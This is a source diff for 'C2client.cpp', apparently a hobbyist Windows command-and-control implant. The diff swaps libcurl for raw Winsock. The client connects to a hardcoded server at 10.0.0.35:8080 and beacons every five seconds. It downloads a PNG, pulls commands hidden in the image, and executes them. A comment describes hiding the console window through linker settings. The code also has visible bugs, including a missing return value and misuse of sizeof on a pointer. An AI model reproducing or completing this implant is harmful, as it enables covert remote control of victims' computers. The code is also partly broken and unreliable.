@@ -1,25 +1,39 @@
 // C2client.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
-
-#include <iostream>
-#include <stdio.h>
-#include <regex>
-#include "curl/curl.h"
-#include <stdexcept>
+#include <winsock2.h>
+#include <WS2tcpip.h>
+//Header for Image Decoding
 #include <wincodec.h>
 #include <wincodecsdk.h>
 #pragma comment(lib, "WindowsCodecs.lib")
 #include <atlbase.h>
 #include <atlcoll.h>
+//Header for Windows Sockets
+#pragma comment(lib, "Ws2_32.lib")
+#include <iostream>
+#include <stdio.h>
+#include <regex>
+#include <stdexcept>
+#include <sstream>
+#include <map>
+
+
+
+//Struct for client socket
+struct Client {
+	struct addrinfo* result, * ptr, hints;
+};
 
 // To hide the console window I modified compiler settings as follows: Under linker set Subsystem to /SUBSYSTEM:windows  and Entry point to: mainCRTStartup
 UINT GetStride(const UINT width, const UINT bitCount);
 HRESULT getCommands(std::string *commands);
-size_t executeCommands(std::vector<std::string>* list,CURL *curl);
+size_t executeCommands(std::vector<std::string>*);
 size_t parseCommands(std::vector<std::string>* commandList, std::string commandHeader);
-
+int initSock(Client* client);
+int parseHeader(char* header, std::map<std::string, std::string>* headerMap);
 //Struct Types for command
 //Command sequence: <COM: TYPE-VALUE:TYPE-VALUE....etc>
+
 enum TYPE {
 	KILL, //0-0
 	CONF, //1-VAR-VAL
@@ -35,9 +49,6 @@ unsigned long int beaconTime = 5000;	//How often client beacans out to server
 
 int main()
 {	
-	//Curl Handle
-	CURL* curlHandle;						//CURL handle to conduct GET/POST requests 
-	CURLcode response;						//variable to handle Error handling of CURL
 	std::string commands;					//String to hold commands (Used to grab all encoded commands from image)
 	std::vector<std::string> commandList;	//Vector to store each individual command
 	HRESULT HR;								//Error handler for COM Objects
@@ -50,61 +61,43 @@ int main()
 		exit(EXIT_FAILURE);
 	}
 
-	//Initialize CURL handle
-	curlHandle = curl_easy_init();
+	//Initialize Socket
+	//1. Initialize WinSock
+	//2. Create a socket
+	//3. Connect to server
+	Client client;
+	initSock(&client);
+	//4. Send Request, Get request
+	//5 Disconnect
 
-	if (curlHandle) {
-		//Loop Forever here
-		while (true) {
-			//Sleep for 5 seconds before checking C2 server again
-			Sleep(beaconTime);
-			//Open temp file for writing
-			FILE* file;
-			fopen_s(&file, "temp.png", "wb");
-			if (file == NULL) {
-				OutputDebugStringA("Server: Unable to open temporary file for writing\n");
-				exit(EXIT_FAILURE);
-			}
-
-			//Set curl file pointer
-			curl_easy_setopt(curlHandle, CURLOPT_WRITEDATA, file);
-			//Set curl URL
-			curl_easy_setopt(curlHandle, CURLOPT_URL, URL.c_str());
-			//Grab the C2 Image file for parsing
-			if ((response = curl_easy_perform(curlHandle)) != CURLE_OK) {
-				OutputDebugStringA("Unable to grab Image\n");
-				fclose(file);
-				continue;
-			}
-			//File can be closed now
-			fclose(file);
-			//Decode the image and get the commands
-			if ((HR = getCommands(&commands)) != S_OK) {
-				OutputDebugStringA("Server: Unable to grab encoded commands\n");
-				continue;
-			}
-			//Parse Command header
-			if (parseCommands(&commandList, commands) == -1) {
-				OutputDebugStringA("Server: Unable to parse commands\n");
-				//clear commands previously grabbed
-				commandList.clear();
-				commands = "";
-				continue;
-			}
-			//Execute commangs grabbed
-			executeCommands(&commandList,curlHandle);
-			//Clear Commands
-			commands = "";
-			commandList.clear();
-			
-			
-
+	//Loop Forever here
+	while (true) {
+		//Sleep for 5 seconds before checking C2 server again
+		Sleep(beaconTime);
+		//Decode the image and get the commands
+		if ((HR = getCommands(&commands)) != S_OK) {
+			OutputDebugStringA("Server: Unable to grab encoded commands\n");
+			continue;
 		}
+		//Parse Command header
+		if (parseCommands(&commandList, commands) == -1) {
+			OutputDebugStringA("Server: Unable to parse commands\n");
+			//clear commands previously grabbed
+			commandList.clear();
+			commands = "";
+			continue;
+		}
+		//Execute commangs grabbed
+		executeCommands(&commandList);
+		//Clear Commands
+		commands = "";
+		commandList.clear();
+			
+			
+
+		
 	}
-	else {
-		OutputDebugStringA("Client: Unable to Initialize CURL Object");
-		return EXIT_FAILURE;
-	}
+
 }
 
 
@@ -210,7 +203,7 @@ size_t parseCommands(std::vector<std::string>* commandList, std::string commandH
 	return 0;
 }
 //Execute Commands
-size_t executeCommands(std::vector<std::string>* list, CURL* curl) {
+size_t executeCommands(std::vector<std::string>* list) {
 	std::string varName;
 	std::string varValue;
 	//Iterate through commands and call them (Will need parsing later);
@@ -278,3 +271,117 @@ UINT GetStride(const UINT width, const UINT bitCount) {
 	return stride;
 }
 
+int initSock(Client *client) {
+	WSADATA wsaData;
+	int result;
+	//Initialize Winsock (Initiate use of WS2_32.dll)
+	//MAKEWORD(2,2) makes a request for version 2.2 of Winsock
+	if ((result = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0) {
+		//Need to improve debug logging for this....
+		OutputDebugStringA("Client: Failed Initializing WSAstartup: \n");
+		return result;
+	}
+	//Ensure memory of struct is clear
+	ZeroMemory(&client->hints, sizeof(client->hints));
+	client->hints.ai_family = AF_UNSPEC; //Unspecified so we can use either IPV4/IPV6
+	client->hints.ai_socktype = SOCK_STREAM;
+	client->hints.ai_protocol = IPPROTO_TCP;
+
+	if ((result = getaddrinfo("10.0.0.35", "8080", &client->hints, &client->result)) != 0) {
+		OutputDebugStringA("Client: Failed to getaddrinfo for server: \n");
+		WSACleanup();
+		return result;
+	}
+
+	SOCKET sock;
+	client->ptr = client->result;
+	if ((sock = socket(client->ptr->ai_family, client->ptr->ai_socktype, client->ptr->ai_protocol)) == INVALID_SOCKET) {
+		OutputDebugStringA("Client: Failed to create socket: \n");
+		freeaddrinfo(client->result);
+		WSACleanup();
+		return result;
+	}
+
+	if ((result = connect(sock, client->ptr->ai_addr, (int)client->ptr->ai_addrlen)) == SOCKET_ERROR) {
+		closesocket(sock);
+		sock = INVALID_SOCKET;
+		OutputDebugStringA("Client: Unable to connect to server: \n");
+		freeaddrinfo(client->result);
+		WSACleanup();
+		return result;
+	}
+
+	//Test Buffer
+	const char* sendbuf = "GET /images/testing.png HTTP/1.1";
+	if ((result = send(sock, sendbuf, (int)strlen(sendbuf), 0)) == SOCKET_ERROR) {
+		OutputDebugStringA("Client: Unable to send: \n");
+		closesocket(sock);
+		WSACleanup();
+		return result;
+	}
+	//Bufer to hold data
+	char* recvBuff = (char*)malloc(sizeof(char)* 4096);
+	std::vector<std::string> token;
+	if ((result = recv(sock, recvBuff, 1024, 0)) == -1) {
+		OutputDebugStringA("Client: Did not recieve data from server");
+		closesocket(sock);
+		WSACleanup();
+	}
+	//std::string header(recvBuff, 1024);
+	/*int beginning = 0;
+	for (int end = 0; (end = header.find(" ", end)); end++) {
+		token.push_back(header.substr(beginning, end - beginning));
+		beginning = end + 1;
+	}
+	*/
+	std::map<std::string, std::string> headerMap;
+	if (parseHeader(recvBuff, &headerMap)) {
+		return -1;
+	}
+	FILE* file;
+	fopen_s(&file, "temp.png", "wb");
+	if (file == NULL) {
+		OutputDebugStringA("Client: Unable to open temporary file for writing\n");
+		closesocket(sock);
+		WSACleanup();
+		return -1;
+	}
+	while (result > 0) {
+		result = recv(sock, recvBuff, 4096, 0);
+		fwrite(recvBuff, 1, result, file);
+		memset(recvBuff, 0, sizeof(recvBuff));
+
+	}
+	//File can be closed now
+	
+	fclose(file);
+
+}
+
+//Parse Header, store attributes and values in a header map
+int parseHeader(char* header, std::map<std::string, std::string>* headerMap) {
+	std::istringstream resp(header);	//Input stream for string buffer
+	std::string output;					//Temporary string to hold each line of the header request
+	int index;							//Index for string
+	int countInitial = 0;				//Used to parse HTTP version and status
+	//Extract characters from the stream (Delim character is \n);
+	while (std::getline(resp, output) && output != "\r") {
+		//If initial, grab HTTP Version and Status Code
+		if (countInitial == 0) {
+			index = output.find(' ', 0);
+			headerMap->insert(std::make_pair("Ver", output.substr(0, index)));
+			headerMap->insert(std::make_pair("Status", output.substr(index + 1, output.length() - index -2)));
+			countInitial = 1;
+		}
+		//Else, grab all other attributes and values
+		else {
+			index = output.find(':', 0);
+			if (index != std::string::npos) {
+				headerMap->insert(std::make_pair(output.substr(0, index),output.substr(index + 2,output.length() -index -3 )));
+			}
+		}
+	}
+	//Clear the buffer memory
+	memset(header, 0, sizeof(header));
+	return 0;
+}
